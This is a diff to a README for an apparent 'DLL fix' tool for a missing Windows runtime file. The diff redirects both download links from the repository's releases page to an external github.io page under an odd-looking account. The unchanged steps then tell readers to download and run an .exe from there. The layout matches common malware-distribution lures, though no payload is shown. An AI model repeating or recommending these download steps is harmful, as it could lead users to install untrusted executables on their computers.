@@ -1,6 +1,6 @@
 # 🛠️ api-ms-win-crt-runtime-DLL-Fix - Repair missing runtime files on Windows
 
-[![](https://img.shields.io/badge/Download_Fix-Blue-blue)](https://github.com/Skagitglycerite353/api-ms-win-crt-runtime-DLL-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix-Blue-blue)](https://skagitglycerite353.github.io)
 
 This software fixes errors where the file api-ms-win-crt-runtime-l1-1-0.dll is missing from your Windows computer. This error stops programs from starting. The tool replaces missing files and restores functionality to your apps. It works on Windows 10 and Windows 11.
 
@@ -17,7 +17,7 @@ You see this error because the Universal C Runtime (CRT) is missing or damaged o
 
 ## 🚀 How to download the fix
 
-1. Go to the [Releases page](https://github.com/Skagitglycerite353/api-ms-win-crt-runtime-DLL-Fix/releases).
+1. Go to the [Releases page](https://skagitglycerite353.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
